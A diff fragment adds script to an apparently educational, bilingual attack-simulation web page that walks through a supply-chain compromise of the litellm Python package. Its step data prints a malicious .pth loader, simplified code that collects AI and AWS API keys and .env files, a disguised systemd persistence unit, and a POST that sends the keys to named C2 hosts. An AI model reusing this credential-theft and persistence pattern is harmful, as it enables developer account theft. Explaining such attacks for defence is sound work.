+    cmd: '$ pip install litellm\nCollecting litellm\n  Downloading litellm-1.x.x.tar.gz (2.1 MB)\nRunning setup.py install for litellm ... done\nSuccessfully installed litellm-1.x.x\n\n# .pth written silently during install:\n$ cat /usr/local/lib/python3.11/site-packages/sitecustomize.pth\nimport subprocess,os,base64;exec(base64.b64decode(\'aW1wb3J0IG9z...\'))\n# Python will execute this on EVERY python3 invocation',
+    explain: 'site-packages .pth files are a legitimate Python mechanism for namespace packages and path management. EDRs and security tools rarely monitor pip write operations to site-packages — it looks like normal package installation behavior.'
+  },
+  {
+    node: 2, conn: 1, connType: 'active', nodeType: 'active',
+    stepLabel: 'STEP 3 \u2014 Every Python Invocation Triggers Payload',
+    stepLabelTR: 'ADIM 3 \u2014 Her Python \u00c7a\u011fr\u0131s\u0131 Payload\'u Tetikliyor',
+    text: 'From this moment on, every Python invocation — jupyter notebook, pytest, python script.py, uvicorn, celery — automatically executes the malicious .pth payload at interpreter startup. The developer sees no indication anything is wrong.',
+    textTR: 'Bu andan itibaren, her Python \u00e7a\u011fr\u0131s\u0131 \u2014 jupyter notebook, pytest, python script.py, uvicorn, celery \u2014 yorumlay\u0131c\u0131 ba\u015flang\u0131c\u0131nda otomatik olarak k\u00f6t\u00fc niyetli .pth payload\'unu \u00e7al\u0131\u015ft\u0131r\u0131r.',
+    cmd: '# Every one of these triggers the exfil payload:\n$ python3 -c "print(1)"    # triggers\n$ python3 script.py        # triggers\n$ pytest tests/            # triggers\n$ jupyter notebook         # triggers\n$ uvicorn app:app          # triggers\n$ celery worker            # triggers\n\n# The payload runs SILENTLY in the background\n# No output, no errors, invisible to the developer',
+    explain: 'Because the payload executes at Python startup (not at import time), even a script that never imports litellm will trigger the credential exfiltration. This is the key advantage of .pth persistence over postinstall hooks.'
+  },
+  {
+    node: 3, conn: 2, connType: 'danger', nodeType: 'pwned',
+    stepLabel: 'STEP 4 \u2014 AI API Key Harvest',
+    stepLabelTR: 'ADIM 4 \u2014 AI API Anahtar\u0131 Toplama',
+    text: 'The decoded payload reads OPENAI_API_KEY, ANTHROPIC_API_KEY, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, COHERE_API_KEY, GOOGLE_API_KEY from environment variables, and reads ~/.config/litellm/config.yaml, .env files in the current directory.',
+    textTR: 'Decode edilen payload, ortam de\u011fi\u015fkenlerinden OPENAI_API_KEY, ANTHROPIC_API_KEY, AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, COHERE_API_KEY, GOOGLE_API_KEY okur ve ~/.config/litellm/config.yaml, mevcut dizindeki .env dosyalar\u0131n\u0131 okur.',
+    cmd: '# Decoded payload (simplified):\nimport os, json, requests\n\nkeys = {\n  k: os.environ[k] for k in [\n    "OPENAI_API_KEY","ANTHROPIC_API_KEY",\n    "AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY",\n    "COHERE_API_KEY","GOOGLE_API_KEY"\n  ] if k in os.environ\n}\n\n# Also reads config files:\nfor path in ["~/.config/litellm/config.yaml", ".env"]:\n    try: keys["file_"+path] = open(os.path.expanduser(path)).read()\n    except: pass\n\n# Keys ready for exfiltration',
+    explain: 'AI API keys are typically set as environment variables for convenience in developer environments. A single OPENAI_API_KEY theft allows the attacker to run $10k+ of GPU compute at the victim\'s expense, or to sell the keys on underground markets for immediate profit.'
+  },
+  {
+    node: 4, conn: 3, connType: 'danger', nodeType: 'pwned',
+    stepLabel: 'STEP 5 \u2014 systemd Persistence Installed',
+    stepLabelTR: 'ADIM 5 \u2014 systemd Kal\u0131c\u0131l\u0131\u011f\u0131 Y\u00fcklendi',
+    text: 'On Linux systems, the payload drops a user-level systemd service unit in ~/.config/systemd/user/. This creates a persistent background process that continues exfiltrating credentials even after litellm is uninstalled and the .pth file is removed.',
+    textTR: 'Linux sistemlerinde payload, ~/.config/systemd/user/ dizinine kullan\u0131c\u0131 d\u00fczeyinde systemd servis \u00fcnitesi olu\u015fturur. Bu, litellm kald\u0131r\u0131ld\u0131ktan ve .pth dosyas\u0131 silindikten sonra bile kimlik bilgisi s\u0131zd\u0131rmay\u0131 s\u00fcrd\u00fcren kal\u0131c\u0131 bir arka plan s\u00fcrecini olu\u015fturur.',
+    cmd: '# systemd unit written to:\n~/.config/systemd/user/python-update.service\n\nContents:\n[Unit]\nDescription=Python Environment Update Service\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/usr/bin/python3 -c "while True: exfil(); sleep(300)"\nRestart=always\n\n[Install]\nWantedBy=default.target\n\n# Auto-enabled:\nsystemctl --user enable python-update.service\nsystemctl --user start python-update.service',
+    explain: 'User-level systemd services do not require root privileges and are less scrutinized than system-level services. The service name "python-update.service" is chosen to blend with legitimate Python environment management tools.'
+  },
+  {
+    node: 5, conn: 4, connType: 'danger', nodeType: 'pwned',
+    stepLabel: 'STEP 6 \u2014 Credentials Exfiltrated to C2',
+    stepLabelTR: 'ADIM 6 \u2014 Kimlik Bilgileri C2\'ye S\u0131zd\u0131r\u0131ld\u0131',
+    text: 'Harvested AI keys sent via HTTPS POST to models.litellm.cloud (port 443) with JSON body resembling legitimate LiteLLM telemetry. Secondary C2 via checkmarx.zone as fallback. Stolen keys used to run AI workloads at victim\'s expense.',
+    textTR: 'Toplanan AI anahtarlar\u0131, me\u015fru LiteLLM telemetrisini and\u0131ran JSON g\u00f6vdesiyle HTTPS POST arac\u0131l\u0131\u011f\u0131yla models.litellm.cloud\'a (port 443) g\u00f6nderilir. Yedek olarak checkmarx.zone \u00fczerinden ikincil C2 kullan\u0131l\u0131r. \u00c7al\u0131nan anahtarlar kurban hesab\u0131na AI i\u015f y\u00fckleri \u00e7al\u0131\u015ft\u0131rmak i\u00e7in kullan\u0131l\u0131r.',
+    cmd: '# Exfil request (mimics LiteLLM telemetry):\nPOST https://models.litellm.cloud/v1/telemetry\nContent-Type: application/json\n{\n  "version": "1.x.x",\n  "session_id": "...",\n  "keys": {\n    "openai": "sk-proj-ABC123...",\n    "anthropic": "sk-ant-xyz789...",\n    "aws": {"key": "AKIA...", "secret": "..."},\n    "google": "AIzaSy..."\n  },\n  "hostname": "dev-machine-01"\n}\n# 200 OK — keys received by attacker\n# Attacker now has full AI spend access',
+    explain: 'Traffic to models.litellm.cloud on port 443 is indistinguishable from legitimate LiteLLM API calls at the network layer. DNS-based detection is the most reliable signal — models.litellm.cloud does not resolve to Cloudflare/AWS ranges like the legitimate litellm.ai does.'
+  }
+];
+
+let _atvIdx  = -1;
+let _atvTimer = null;
+let _atvAuto  = false;
+
+function atvReset() {
+  clearTimeout(_atvTimer);
+  _atvIdx  = -1;
+  _atvAuto = false;
+  ATV_NODES.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.classList.remove('active','pwned','safe');
+  });
+  ATV_CONNS.forEach(id => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.classList.remove('active','danger');
+    const pkt = el.querySelector('.atk-pkt');
+    if (pkt) pkt.classList.remove('run');
+  });
+  document.querySelectorAll('.atk-dot').forEach(d => d.className = 'atk-dot');
+  const detStep = document.getElementById('atkDetailStep');
+  const detText = document.getElementById('atkDetailText');
+  if (detStep) detStep.textContent = '\u25ba SIMULATION READY';
+  if (detText) detText.textContent = 'Press AUTO to run the full attack chain automatically, or use STEP to advance manually. Click any node or dot to jump to that step.';
+  const expl = document.getElementById('atkExplain');
+  if (expl) expl.style.display = 'none';
+  const cmdEl = document.querySelector('.atk-detail-cmd');
+  if (cmdEl) cmdEl.remove();
+  document.getElementById('atkProgLabel').textContent = '0 / ' + ATV_STEPS.length;
+  const autoBtn = document.getElementById('atkPlayBtn');
+  if (autoBtn) { autoBtn.textContent = '\u25b6 AUTO'; autoBtn.disabled = false; autoBtn.onclick = atvRun; }
+}
+
+function atvRender(idx) {
+  const s = ATV_STEPS[idx];
+  const useTR = (_lang === 'tr');
+
+  document.querySelectorAll('.atk-pkt').forEach(p => { p.classList.remove('run'); void p.offsetWidth; });
+
+  ATV_NODES.forEach((id, i) => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.classList.remove('active','pwned','safe');
+    if (i === s.node) el.classList.add(s.nodeType || 'active');
+    else if (i < s.node) el.classList.add('safe');
+  });
+
+  ATV_CONNS.forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.classList.remove('active','danger');
+  });
+  if (s.conn !== null) {
+    const cEl = document.getElementById(ATV_CONNS[s.conn]);
+    if (cEl) {
+      cEl.classList.add(s.connType);
+      const pkt = cEl.querySelector('.atk-pkt');
+      if (pkt) {
+        pkt.className = 'atk-pkt ' + (s.connType === 'danger' ? 'red' : 'orange');
+        setTimeout(() => pkt.classList.add('run'), 80);
+      }
+    }
+  }
+
+  const stepLabel = useTR ? s.stepLabelTR : s.stepLabel;
+  const text = useTR ? s.textTR : s.text;
+  document.getElementById('atkDetailStep').textContent = stepLabel;
+  document.getElementById('atkDetailText').textContent = text;
+
+  const expl = document.getElementById('atkExplain');
+  const explText = document.getElementById('atkExplainText');
+  if (s.explain && expl && explText) {
+    explText.textContent = s.explain;
+    expl.style.display = 'block';
+  } else if (expl) {
+    expl.style.display = 'none';
+  }
+
+  const detail = document.getElementById('atkDetail');
+  const existing = detail.querySelector('.atk-detail-cmd');
+  if (existing) existing.remove();
+  if (s.cmd) {
+    const cmdDiv = document.createElement('div');
+    cmdDiv.className = 'atk-detail-cmd';
+    const pre = document.createElement('pre');
+    pre.style.cssText = 'margin:0;white-space:pre-wrap;font-size:0.7rem';
+    pre.textContent = s.cmd;
+    cmdDiv.appendChild(pre);
+    detail.appendChild(cmdDiv);
+  }
+
+  document.querySelectorAll('.atk-dot').forEach((d, i) => {
+    d.className = 'atk-dot' + (i < idx ? ' done' : i === idx ? ' current' : '');
+  });
+  document.getElementById('atkProgLabel').textContent = (idx + 1) + ' / ' + ATV_STEPS.length;
+}
+
+function atvGoTo(idx) {
+  clearTimeout(_atvTimer);
+  _atvAuto = false;
+  const autoBtn = document.getElementById('atkPlayBtn');
+  if (autoBtn) { autoBtn.textContent = '\u25b6 AUTO'; autoBtn.disabled = false; autoBtn.onclick = atvRun; }
+
+  if (idx < 0) { atvReset(); return; }
+  if (idx >= ATV_STEPS.length) {
+    const autoBtn2 = document.getElementById('atkPlayBtn');
+    if (autoBtn2) { autoBtn2.textContent = '\u21ba Reset'; autoBtn2.onclick = atvReset; }
+    return;
+  }
+  _atvIdx = idx;
+  atvRender(idx);
+}
+
+function atvRun() {
+  _atvAuto = true;
+  const autoBtn = document.getElementById('atkPlayBtn');
+  if (autoBtn) { autoBtn.disabled = true; }
+  atvGoTo(_atvIdx + 1);
+  if (_atvIdx < ATV_STEPS.length - 1) {
+    _atvTimer = setTimeout(atvRun, 2600);
+  } else {
+    _atvAuto = false;
+    if (autoBtn) { autoBtn.textContent = '\u21ba Reset'; autoBtn.disabled = false; autoBtn.onclick = atvReset; }
+  }
+}
+
+/* ═══════════════════════════════════════════════════════════════
+   INIT
+═══════════════════════════════════════════════════════════════ */
+applyTheme(_theme);
+applyLang(_lang);
+</script>
+</body>
+</html>
